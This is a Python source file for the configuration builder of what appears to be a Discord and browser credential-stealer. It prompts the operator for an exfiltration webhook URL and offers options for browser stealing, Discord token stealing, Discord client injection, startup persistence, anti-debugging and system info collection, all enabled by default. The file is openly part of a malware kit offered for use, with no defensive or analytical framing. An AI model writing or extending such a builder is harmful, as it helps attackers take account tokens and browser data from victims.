import re
from InquirerPy import prompt  # type: ignore

class Config:
    """
    The Config class creates the questions that will be prompted to the user
    and returns the configuration data.
    """

    def __init__(self) -> None:
        """
        Initialize the Config class with a list of questions to prompt the user.
        """
        self.questions = [
            {
                "type": "input",
                "name": "webhook",
                "message": "Enter your webhook URL",
                "validate": lambda x: (
                    True if re.match(r"https://(canary.|ptb.)?(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x)
                    else False
                )
            },
            {
                "type": "confirm",
                "name": "antidebug",
                "message": "Enable anti-debugging?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "browsers",
                "message": "Enable browser stealing?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "discordtoken",
                "message": "Enable Discord token stealing?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "injection",
                "message": "Enable Discord injection?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "startup",
                "message": "Enable startup?",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "systeminfo",
                "message": "Enable system info?",
                "default": True,
            },
        ]

    def get_config(self) -> dict:
        """
        Prompt the user with the questions and return the config data.

        Returns:
            dict: A dictionary containing the configuration data.
        """
        return prompt(
            questions=self.questions,
            style={
                "questionmark": "#ff9d00 bold",
                "selected": "#5f819d",
                "instruction": "",  # default
                "answer": "#5f819d bold",
                "question": "",
            },
        )

if __name__ == "__main__":
    config = Config()
    config_data = config.get_config()
    print(config_data)
